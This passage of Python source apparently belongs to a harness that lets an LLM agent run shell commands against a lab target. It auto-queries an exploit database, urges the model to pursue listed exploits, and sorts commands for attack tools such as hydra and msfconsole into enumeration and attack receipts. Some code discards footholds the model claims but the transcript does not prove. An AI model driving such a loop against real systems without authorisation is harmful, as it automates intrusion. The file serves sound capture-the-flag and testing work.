    if re.search(r"\bdnsrecon\b|\bamass\b|\bsubfinder\b|\bfierce\b|\bdnsenum\b", low):
        for p in ports_for("dns"): add(p, "subdomain-brute")
    # ftp anonymous login
    if re.search(r"\bftp\b|\blftp\b|ftp://", low) and re.search(r"anonymous|\banon\b", low):
        for p in ports_for("ftp"): add(p, "anon-login")
    # smb / rpc enumeration
    if re.search(r"smbclient\s+-l|\bnetexec\s+smb\b|\bcrackmapexec\s+smb\b|\benum4linux\b", low):
        for p in ports_for("smb"): add(p, "shares")
    if re.search(r"\brpcclient\b", low):
        for p in ports_for("smb"): add(p, "null-session")
    if re.search(r"\brpcinfo\b", low):
        for p in ports_for("rpcbind"): add(p, "rpcinfo")
    if re.search(r"\bshowmount\b", low):
        for p in ports_for("rpcbind"): add(p, "nfs-shares")
    # ssh credential/user enumeration
    if re.search(r"\bhydra\b|\bmedusa\b|\bpatator\b", low) and re.search(r"\bssh\b", low):
        for p in ports_for("ssh"): add(p, "user-enum")
    # ldap directory queries: -x without bind flags = anonymous bind
    if re.search(r"\bldapsearch\b", low):
        if re.search(r"\s-x\b", low) and not re.search(r"\s-[DWw]\s|\s--bind\b", low):
            for p in ports_for("ldap"): add(p, "anonymous-bind")
        else:
            for p in ports_for("ldap"): add(p, "domain-info")
    # snmp
    if re.search(r"\bsnmpwalk\b|\bsnmpbulkwalk\b", low):
        for p in ports_for("snmp"): add(p, "snmp-walk")
    if re.search(r"\bonesixtyone\b|\bsnmp-check\b", low):
        for p in ports_for("snmp"): add(p, "community-strings")
    # databases: client invocation with a password flag = default-creds attempt;
    # without one = anonymous/empty-credential attempt (user flags alone don't count).
    # low is lowercased, so the flag class is [pw] (covers -p/-P/-W).
    _CREDS_FLAG = re.compile(r"\s-(?:p|w)(?:\s|$)|--password")
    for db, pat in (("mysql", r"\bmysql\b"), ("postgres", r"\bpsql\b"),
                    ("mssql", r"\bsqsh\b|\btsql\b|impacket-mssqlclient")):
        if re.search(pat, low) and re.search(r"\s-h\s|\s--host\b", low):
            ritual = "default-creds" if _CREDS_FLAG.search(low) else "anon-auth"
            for p in ports_for(db): add(p, ritual)
    if re.search(r"\bredis-cli\b", low) and re.search(r"\s-h\s", low):
        for p in ports_for("redis"): add(p, "no-auth")
    if re.search(r"\bmongosh\b|\bmongo\b", low) and re.search(r"\s--host\b|\s-h\s", low):
        for p in ports_for("mongodb"): add(p, "no-auth")

# ---- deterministic attack receipts -------------------------------------------
# Same lesson as the enum receipts: never trust the model to REPORT an attack it
# fired — the transcript is ground truth. attack=<hint>:<ritual> facts are keyed to
# the app the MANAGER's objective names (the recipe-first linkage): the command TYPE
# decides the ritual, the objective decides the target. The manager loop folds them;
# fold() validates the ritual against the node and no-ops on any mismatch.
_ATTACK_RITUALS = ("cve-lookup", "default-creds", "known-exploit-chain")
_ATTACK_CAP = 4

def _derive_attack_facts(cmds, output, app, ok_flags=None):
    """attack=<app>:<ritual> receipts for attacks the transcript proves were FIRED.
    app='' -> no receipts (a recon task is not an attack on a named app).
    ok_flags: same receipt gate as _derive_enum_facts — a failed/timed-out attempt is
    evidence of effort, not of attack completion, and must not close the depth floor."""
    facts, seen = [], set()
    if not app:
        return facts
    def add(ritual):
        f = f"attack={app}:{ritual}"
        if f not in seen:
            seen.add(f); facts.append(f)
    # the auto-searchsploit reflex chunk for the named app IS a cve-lookup run (engine-
    # executed; the chunk only lands in the transcript when the lookup itself succeeded)
    if output and f"[auto-searchsploit {app}]" in (output or "").lower():
        add("cve-lookup")
    for i, cmd in enumerate(cmds or []):
        if not cmd:
            continue
        if ok_flags is not None and not ok_flags[i]:
            continue
        if len(facts) >= _ATTACK_CAP:
            break
        for seg in re.split(r";|&&", str(cmd)):
            low = seg.strip().lower()
            if re.match(r"(?:command\s+-v|which|type)\b", low):
                continue
            # cve-lookup: the public exploit record was consulted for the product
            if re.search(r"\bsearchsploit\b", low) or ("nuclei" in low and "cve" in low):
                add("cve-lookup")
            # known-exploit-chain: a real exploit/module was RUN (not listed/read)
            if re.search(r"\bmsfconsole\b", low) and re.search(r"\b(?:run|exploit)\b", low):
                add("known-exploit-chain")
            elif (re.search(r"\b(?:python3?|ruby|perl)\b", low)
                  and re.search(r"\.(?:py|rb|pl)\b", low)
                  and ("http" in low or re.search(r"10\.129\.\d+\.\d+", low))):
                add("known-exploit-chain")
            # default-creds: a credential attempt was made against a web form
            if re.search(r"\b(?:hydra|medusa|patator)\b", low) and "http" in low:
                add("default-creds")
    return facts

def _strip_derived(facts):
    """Drop self-reported attack= facts from the VERDICT: the manager loop re-derives them
    deterministically keyed to the objective's named app. A self-reported attack receipt is
    unverifiable and would let a confabulating trooper close the depth floor without firing
    anything (same rule as the shell=/session=/rce_as= proof gate)."""
    return [f for f in (facts or []) if not str(f).startswith("attack=")]

# generic HTML titles that must NOT become app= facts (the page's name is not the
# app's name; slugged forms so "Sign in" and "signin" both land here)
_TITLE_STOPWORDS = {
    "login", "log-in", "signin", "sign-in", "signup", "sign-up", "register",
    "home", "index", "welcome", "error", "not-found", "page-not-found",
    "admin", "dashboard", "test", "default", "app", "api", "http", "https",
    "html", "localhost", "access-denied", "forbidden", "unauthorized",
}

def _diagnose_blocked(joined):
    """Map a failed transcript to a SPECIFIC blocked-reason enum for the content-blind manager,
    instead of the useless generic 'hit turn cap'. These are the real walls that stall live lanes."""
    j = (joined or "").lower()
    # the engine's OWN searchsploit reflex chunks are labelled [auto-searchsploit ...] and
    # end in "Exploits: No Results" — strip them before diagnosing, or every cap-out reads
    # as the target's "no results" wall (pass 6: all six cap-outs misdiagnosed
    # no_matching_module, hiding the real story from the content-blind manager)
    j = re.sub(r"\[auto-searchsploit[^\n]*\n.*?(?=\n\$ |\Z)", "", j, flags=re.S)
    checks = [
        (r"couldn't connect to server|connection refused|code=000|failed to connect to .*443|:443 .*clos",
         "wrong_scheme_or_port: 443 closed / target is http on another port - switch scheme"),
        (r"exploit completed, but no session was created",
         "exploit_ran_no_session: module fired but no shell (payload/handler/gadget or auth-state)"),
        (r"/users/sign_up/welcome|onboarding|almost there|complete your profile",
         "onboarding_gate: signup not finalized (submit welcome form, Rails _method=patch)"),
        (r"needs to be confirmed|confirm your email|has not been confirmed|unconfirmed",
         "email_confirmation_required: self-registered account cannot authenticate"),
        (r"401 unauthorized|403 forbidden|invalid login|authentication (failed|required)|please sign in",
         "auth_wall: valid credentials or an active session are required"),
        # the lookbehind keeps the model's own `searchsploit` runs ("Exploits: No Results")
        # from reading as the target's "no results" wall
        (r"(?<!exploits: )no results|failed to load module|invalid module|module .* not found",
         "no_matching_module: no exploit/module indexed for this service+version"),
        (r"not vulnerable|not affected|already patched|patched version",
         "version_patched: pivot to a version-matched CVE"),
        (r"could not resolve host|name or service not known|temporary failure in name resolution",
         "dns_unresolved: vhost not in resolver (/etc/hosts) - provision it first"),
        (r"mount: only root|operation not permitted|permission denied.*(?:mount|nfs)|not permitted to mount",
         "needs_root: exec host lacks the privilege for this action - use an unprivileged "
         "alternative (nfs-ls/curl) or escalate locally"),
    ]
    for pat, reason in checks:
        if re.search(pat, j):
            return reason
    return ""



# ---- mechanical enumeration reflex: any product identified -> consult the exploit DB ---------
# General and box-independent: detects "<name> <version>" banners and camelCase app names in
# what the trooper actually saw, and runs searchsploit on each ONCE. This makes the exploit-DB
# lookup a guaranteed step, not a suggestion the small model can skip.
_SS_VER  = __import__("re").compile(r"\b([A-Za-z][A-Za-z0-9+.\-]{2,20})[ /]v?(\d+\.\d[\w.]*)")
_SS_CAML = __import__("re").compile(r"\b([a-z]{2,}[A-Z][A-Za-z]{2,})\b")
_SS_STOP = {"http","https","html","xhtml","ubuntu","debian","linux","unix","content","charset",
            "text","json","status","server","title","banner","version","default","index","login",
            "python","openssl"}
def _auto_searchsploit(text, target, seen, cap=6):
    prods = []
    for m in _SS_VER.finditer(text or ""):
        prods.append(m.group(1))
    for m in _SS_CAML.finditer(text or ""):
        prods.append(m.group(1))
    chunks = []
    for raw in prods:
        name = raw.strip().lower()
        if len(name) < 3 or name in _SS_STOP or name in seen:
            continue
        if len(seen) >= cap:
            break
        seen.add(name)
        out = run_cmd(f"searchsploit {name} | head -n 20", target)
        if out and "Exploits: No Results" not in out and out.strip():
            chunks.append(f"[auto-searchsploit {name}]\n{out}")
    return ("\n".join(chunks))[:3000]


class Trooper:
    def __init__(self, key=None):
        self.key = key or _key()   # empty is fine for local ollama

    def fire(self, lane):
        target = lane.get("target", "")
        obj = lane.get("objective") or (f"Run this and report the result:\n{lane.get('cmd','')}")
        if lane.get("cmd") and "Suggested" not in obj and lane.get("objective"):
            obj += f"\nSuggested starting command:\n{lane['cmd']}"
        obj += ("\n(ENGINE NOTE, required: your verdict facts must include one enum=<port>:<check> "
                "receipt per discovery check you completed, e.g. enum=80:dirs after a dir brute.)")
        sess = os.environ.get("GB_SESSION") or "gb-hold"
        sys_content = SYS_TMPL.format(n=MAX_TURNS, sess=sess, lhost=os.environ.get("TROOPER_LHOST","the operator box VPN IP"))
        msgs = [{"role": "system", "content": sys_content},
                {"role": "user", "content": f"TARGET: {target}\nOBJECTIVE: {obj}"}]
        cmds, outs = [], []
        ok_flags = []   # parallel to cmds: False = that command failed/timed out/blocked
        _ss_seen = set()
        # prime the reflex from the objective text itself (manager may name the product)
        _pre = _auto_searchsploit(obj, target, _ss_seen)
        if _pre:
            msgs.append({"role": "user", "content":
                "EXPLOIT-DB (auto-run for the product in your objective):\n" + _pre})
        # recipe-first, DETERMINISTIC: when the manager's objective names a specific app
        # (the attack-lane linkage), consult the exploit DB for THAT app ourselves instead
        # of merely SUGGESTING it — the suggestion was ignored and the trooper spent its
        # whole budget on fingerprint curls (run 747 step 4: 10 cmds, 401 wall, zero
        # exploits). The trooper now STARTS from real public-exploit results.
        _app = (lane.get("_app") or "").strip().lower()
        if _app and _app not in _ss_seen:
            _ss_seen.add(_app)
            _out = run_cmd(f"searchsploit {_app} | head -n 20", target)
            if _out and "Exploits: No Results" not in _out and _out.strip():
                # the transcript (outs) is ground truth for the manager loop's receipt
                # derivation — the chunk MUST land there with the auto-searchsploit label,
                # or the attack=cve-lookup receipt never folds (run 748 step 3)
                _chunk = f"[auto-searchsploit {_app}]\n{_out}"
                msgs.append({"role": "user", "content":
                    f"EXPLOIT-DB (auto-run for the app your objective names: {_app}):\n{_out}"})
                outs.append(_chunk + "\n")
        for _ in range(MAX_TURNS):
            try:
                reply = _chat(msgs, self.key)
            except Exception as e:
                return {"success": False, "evidence": f"trooper api error: {e}", "facts": [],
                        "telemetry": {"blocked": "trooper api error", "next": "retry lane"},
                        "output": "".join(outs), "cmds": cmds, "ok_flags": ok_flags,
                        "id": lane.get("id")}
            msgs.append({"role": "assistant", "content": reply})
            v = _parse_verdict(reply)
            cmd = _extract_cmd(reply)
            if v is not None and not cmd:            # final verdict, no new command
                _joined = "".join(outs)
                _facts, _dropped = _gate_execution_facts(v.get("facts", []) or [], outs)
                # receipts for checks the transcript proves ran, regardless of what the
                # model remembered to report (runs 739/740: verdict facts had zero enum=);
                # attack= facts are the manager loop's to derive — never trust a self-report
                _facts = _strip_derived(_facts)
                _facts = _facts + [f for f in _derive_enum_facts(cmds, ok_flags) if f not in _facts]
                _tel = v.get("telemetry") or {}
                if _dropped:
                    # the model claimed a foothold the transcript does not prove -> correct it
                    _tel = dict(_tel)
                    _tel["observed"] = re.sub(r"\bshell\b,?\s*", "", str(_tel.get("observed", "")))
                    _tel["blocked"] = ((_tel.get("blocked") or "") +
                        " | UNPROVEN_FOOTHOLD_DROPPED: exploit/module was only read or listed, "
                        "no live id/whoami/session was produced against the target").strip(" |")
                return {"success": any(str(f).startswith(("shell=","flag=","app=","hash=","ftp=")) for f in _facts),
                        "evidence": str(v.get("evidence", ""))[:200],
                        "facts": _facts,
                        "telemetry": _tel,
                        "output": _joined[:8000], "cmds": cmds, "ok_flags": ok_flags,
                        "id": lane.get("id")}
            if not cmd:                              # model stalled without a command or verdict
                msgs.append({"role": "user", "content": "Output one ```bash``` command, or the "
                             "final VERDICT: {...} line if you are done."})
                continue
            cmds.append(cmd)
            out = run_cmd(cmd, target)
            ok_flags.append(not FAIL_MARK.search(out))
            outs.append(f"$ {cmd}\n{out}\n")
            msgs.append({"role": "user", "content": out})
            _ss = _auto_searchsploit(out, target, _ss_seen)
            if _ss:
                outs.append(_ss + "\n")
                msgs.append({"role": "user", "content":
                    "EXPLOIT-DB says (auto-run for products you just identified) -- if "
                    "a promising exploit is listed, pursue it now:\n" + _ss})
        # cap reached with no clean VERDICT: salvage facts from the transcript so a real win
        # isn't discarded just because the model never emitted the terminal line.
        joined = "".join(outs)
        sf = _salvage_facts(outs, target)
        # same deterministic receipts on the cap-out path; attack= stays the manager loop's
        sf = _strip_derived(sf)
        sf = sf + [f for f in _derive_enum_facts(cmds, ok_flags) if f not in sf]
        got = any(f.startswith(("shell=", "flag=", "app=", "hash=", "ftp=")) for f in sf)
        # salvage a distilled telemetry too: fact KEYS only (never values) + what ran, so a
        # cap-out with no clean VERDICT still tells the manager something tactical.
        sf_keys = sorted({f.split("=", 1)[0] for f in sf}) if sf else []
        salv_tel = {"observed": ("signals: " + ", ".join(sf_keys)) if sf_keys else "no clear signals",
                    "tried": f"{len(cmds)} cmd(s) before turn cap",
                    "blocked": (_diagnose_blocked(joined) or ("" if got else "hit turn cap with no proof")),
                    "next": "narrow the objective or hand to a fresh lane"}
        return {"success": got,
                "evidence": ("salvaged: " + ", ".join(sf))[:200] if sf else "trooper hit turn cap (no signals)",
                "facts": sf, "telemetry": salv_tel,
                "output": joined[:8000], "cmds": cmds, "ok_flags": ok_flags,
                "id": lane.get("id")}

if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--objective", required=True)
    ap.add_argument("--cmd", default="")
    a = ap.parse_args()
    t0 = time.time()
    v = Trooper().fire({"id": "cli", "target": a.target, "objective": a.objective, "cmd": a.cmd})
    v["secs"] = round(time.time() - t0, 1)
    print(json.dumps(v, indent=2))
